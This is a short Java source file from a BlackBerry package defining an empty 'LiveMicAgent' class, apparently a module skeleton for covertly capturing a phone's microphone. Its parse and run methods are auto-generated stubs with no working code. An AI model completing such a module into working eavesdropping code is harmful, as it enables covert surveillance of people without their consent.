package blackberry.agent;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

public class LiveMicAgent extends Agent {
    //#ifdef DEBUG
    private static Debug debug = new Debug("LiveMicAgent", DebugLevel.VERBOSE);
    //#endif
    public LiveMicAgent(final boolean agentStatus) {
        super(Agent.AGENT_LIVE_MIC, agentStatus, true, "LiveMicAgent");

    }
    
    public LiveMicAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }
    
    protected boolean parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

    protected void actualRun() {
        // TODO Auto-generated method stub

    }

}
